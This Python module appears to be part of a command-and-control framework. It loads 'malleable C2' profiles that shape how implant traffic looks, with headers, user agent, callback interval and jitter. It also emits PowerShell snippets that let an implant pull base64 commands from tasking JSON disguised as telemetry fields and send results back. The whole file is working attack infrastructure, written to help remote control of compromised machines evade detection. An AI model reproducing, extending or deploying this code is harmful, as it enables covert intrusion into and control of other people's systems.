import logging
logger = logging.getLogger(__name__)

import os, json, random
import re
import textwrap
from copy import deepcopy
from dataclasses import dataclass
from typing import Dict, Optional, Union, Any
from core.malleable_c2.malleable_c2 import parse_malleable_profile, MalleableProfile, get_listener_by_port_and_transport

RARE_HEADERS = [
	"X-Correlation-ID",
	"X-Request-ID",
	"X-Custom-Context",
	"X-Worker-Name",
	"X-Data-Context",
	"X-Trace-ID",
]

@dataclass
class ProfileConfig:
	get_uri: str
	post_uri: str
	output_envelope: str
	output_mapping: Any
	post_client_envelope: str
	post_client_mapping: Any
	accept: Optional[str]
	host:   Optional[str]
	byte_range: Optional[int]
	client_headers: Dict[str,str]
	useragent: Optional[str]
	interval: Optional[int]
	jitter: Optional[int]

def load_profile(
	profile_path: str,
	default_headers: Dict[str,str],
	default_ua: str,
	port: Union[str, int],
	transport: str
) -> ProfileConfig:
	"""
	Load & normalize a malleable‐C2 JSON profile (or fall back to a listener's one).
	"""
	# if they passed a bare MalleableProfile → unwrap it
	if not isinstance(profile_path, str):
		raise ValueError("path must be a string")

	mp = parse_malleable_profile(profile_path)
	if mp is None:
		raise ValueError(f"could not parse {profile_path!r}")

	# Grab the two header dicts: CLI defaults vs. profile
	raw_cli = dict(default_headers or {})
	# profile "client" headers block
	g   = deepcopy(mp.get_block("http-get") or {})
	pc  = deepcopy(g.get("client", {}) or {})
	raw_prof = deepcopy(pc.get("headers", {}))

	# 1) Accept
	accept_val = None
	if "Accept" in raw_cli:
		accept_val = raw_cli.pop("Accept", None)
	elif "Accept" in raw_prof:
		accept_val = raw_prof.pop("Accept", None)

	# 2) Host
	host_val = None
	if "Host" in raw_cli:
		host_val = raw_cli.pop("Host", None)
	elif "Host" in raw_prof:
		host_val = raw_prof.pop("Host", None)

	# 3) Range → extract first integer
	range_val = None
	for hdr in ("Range",):
		if hdr in raw_cli:
			m = re.search(r"\d+", raw_cli.pop(hdr, None))
			if m: range_val = int(m.group())
			break
		if hdr in raw_prof:
			m = re.search(r"\d+", raw_prof.pop(hdr, None))
			if m: range_val = int(m.group())
			break

	# Now merge whatever's left into client_headers
	ch = {}
	ch.update(raw_prof)   # profile headers have lower priority
	ch.update(raw_cli)    # CLI headers override

	fp = random.choice(RARE_HEADERS)
	ch[fp] = mp.name

	# stick it on the listener so we can do per‐agent overrides later
	lst = get_listener_by_port_and_transport(port, transport)
	if lst is None:
		raise ValueError(f"No {transport} listener on port {port}")

	#lst.profiles = getattr(lst, "profiles", {})
	#lst.profiles[mp.name] = os.path.abspath(profile_path)

	status = update_listener_profile_list(port, transport, mp)

	if not status:
		return False

	# http-get
	g  = mp.get_block("http-get") or {}
	c  = (g.get("client") or {})
	cfg = mp.get_block("config") or {}
	ct = cfg.get("callback_timing", {})

	# http-post
	p  = deepcopy(mp.get_block("http-post") or {})
	post_client = deepcopy(p.get("client", {}))
	post_client_output = deepcopy(post_client.get("output", {}))

	post_client_envelope = post_client_output.get("envelope", "base64-json")
	post_client_mapping = post_client_output.get("mapping", {"output": "{{payload}}"})

	srv = g.get("server", {}) or {}
	out = srv.get("output", {})
	envelope = out.get("envelope", "base64-json")
	# the raw mapping object ({"cmd":"{payload}", ...})

	# Mapping with fallback
	mapping = out.get("mapping", {"cmd":"{{payload}}", "DeviceTelemetry":{"Telemetry":"{{payload}}"}})

	# merge CLI headers with profile headers
	#ch = dict(default_headers)
	ch.update(c.get("headers", {}))

	return ProfileConfig(
		get_uri       = g.get("uri", "/"),
		post_uri      = p.get("uri", "/"),
		output_envelope = envelope,
		output_mapping = mapping,
		post_client_envelope = post_client_envelope,
		post_client_mapping = post_client_mapping,
		accept         = accept_val,
		host           = host_val,
		byte_range     = range_val,
		client_headers= ch,
		useragent     = c.get("useragent") or default_ua,
		interval      = ct.get("interval"),
		jitter        = ct.get("jitter"),
	)

def update_listener_profile_list(port: int, transport: str, profile: MalleableProfile):
	"""
	Given a port, transport, and a path to a JSON profile,
	attach that profile to the matching listener by name→fullpath.
	Returns the updated dict of all profiles on that listener.
	"""
	# 1) find our listener
	listener = get_listener_by_port_and_transport(port, transport)
	if listener is None:
		raise ValueError(f"No listener found on {transport.upper()} port {port}")

	# 2) load + parse the profile so we can ask for its top‐level name
	"""prof = parse_malleable_profile(profile_path)
	if prof is None:
		raise ValueError(f"Failed to parse profile at {profile_path!r}")"""

	# 3) make sure we have a place to hang multiple profiles
	if not hasattr(listener, "profiles") or listener.profiles is None:
		listener.profiles = {}

	# 4) insert (or overwrite) this one
	listener.profiles[profile.name] = profile

	if listener.profiles[profile.name]:
		return True

	else:
		return False
	#return listener.profiles

def _render_ps_mapping(mapping: dict) -> str:
	"""
	Emit a PowerShell snippet that picks out the leaf value marked "{{payload}}"
	according to the JSON mapping, e.g. Metadata.Imageupdate
	"""
	payload_matches = ("{{payload}}", "{payload}")
	def find_paths(prefix, obj):
		for k, v in obj.items():
			if isinstance(v, dict):
				yield from find_paths(prefix + [k], v)
			elif v in payload_matches:
				yield prefix + [k]

	paths = list(find_paths([], mapping))
	if not paths:
		# fallback to the old DeviceTelemetry.Telemetry
		return textwrap.dedent("""
			if ($task.DeviceTelemetry) {
				$cmd_b64 = $task.DeviceTelemetry.Telemetry;

		""").replace("\n", "")

	# pick the first matching path
	path = paths[0]
	accessor = "$task." + ".".join(path)
	return textwrap.dedent(f"""
		if ({accessor}) {{
			$cmd_b64 = {accessor};

	""").replace("\n", "")

def _render_ps_output(mapping: dict) -> str:
	payload_matches = ("{{payload}}", "{payload}")

	def walk(obj):
		lines = []
		for k, v in obj.items():
			if isinstance(v, dict):
				inner = walk(v)
				lines.append(f"'{k}' = @{{{inner}}}")
			elif v in payload_matches:
				lines.append(f"'{k}' = $b64")
			else:
				# literal strings
				lines.append(f"'{k}' = '{v}'")
		return "; ".join(lines)

	body_table = "@{" + walk(mapping) + "}"
	# single‐line PS snippet
	return f"$body = {body_table} | ConvertTo-Json;"


def _extract_payload_from_msg(msg: dict, mapping: dict) -> str:
    """
    Given the incoming JSON `msg` and a profile's `mapping` section,
    find the first leaf whose value is a payload placeholder
    (either "{{payload}}" or "{payload}"), then walk `msg` along that
    same key-path to return the embedded Base64 string.
    Falls back to msg['output'] if nothing matches.
    """
    # collect all key-paths where the mapping value == payload placeholder
    paths = []
    placeholders = ("{{payload}}", "{payload}")

    def recurse(node, path):
        for k, v in node.items():
            if isinstance(v, dict):
                # dive deeper
                recurse(v, path + [k])
            elif isinstance(v, str) and v in placeholders:
                # record this full path
                paths.append(path + [k])

    recurse(mapping, [])

    if paths:
        # take the first mapping path
        path = paths[0]
        val = msg
        for key in path:
            if not isinstance(val, dict):
                return ""
            val = val.get(key, {})
        # if we landed on a string, return it, else empty
        return val if isinstance(val, str) else ""

    # fallback to the old-school "output" key
    return msg.get("output", "") or ""